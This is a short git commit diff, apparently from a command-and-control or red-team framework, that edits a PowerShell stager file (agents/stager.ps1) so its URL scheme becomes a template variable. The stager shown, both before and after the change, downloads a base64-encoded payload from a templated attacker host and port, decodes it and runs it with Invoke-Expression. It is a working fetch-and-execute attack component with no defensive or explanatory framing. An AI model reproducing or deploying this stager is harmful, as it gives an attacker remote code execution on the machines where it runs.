b748d41b2f737ca1ee62ba981055b4a45db99e04
darkz3ro <darkz3ro@localhost.localdomain>
2020-05-30 21:22:02 +0300

    fixed urls in the agent

--- agents/stager.ps1
+++ agents/stager.ps1
@@ -1,5 +1,5 @@
 $wc2 = New-Object system.Net.WebClient;
-$enc = $wc2.downloadString("http://{ip}:{port}{b64payload}");
+$enc = $wc2.downloadString("{HTTP}://{ip}:{port}{b64payload}");
 $b = [System.Convert]::FromBase64String($enc)
 $b=[System.Text.Encoding]::UTF8.GetString($b)
 Invoke-Expression $b
